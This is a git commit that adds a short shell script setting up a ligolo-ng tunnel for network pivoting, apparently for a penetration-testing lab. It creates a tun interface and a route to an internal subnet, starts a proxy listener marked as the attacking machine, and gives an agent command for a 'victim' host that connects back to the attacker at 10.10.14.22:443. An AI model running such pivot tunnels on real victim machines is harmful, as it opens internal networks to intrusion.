3dfdfaef887b0f386c477ba977b87bf3c01d919c
0xhanu58 <0xhanu58@proton.me>
2025-02-28 13:55:28 +0530

    Create ligolo-setup.sh

---
+++ ligolo-setup.sh
@@ -0,0 +1,8 @@
+#/bin/bash
+sudo ip tuntap add user hanu58 mode tun ligolo
+sudo ip link set ligolo up
+sudo ip route add 10.10.69.0/24 dev ligolo
+
+sudo ./proxy -selfcert -laddr 0.0.0.0:443 # attacking machine
+
+.\agent -connect 10.10.14.22:443 -ignore-cert # victim
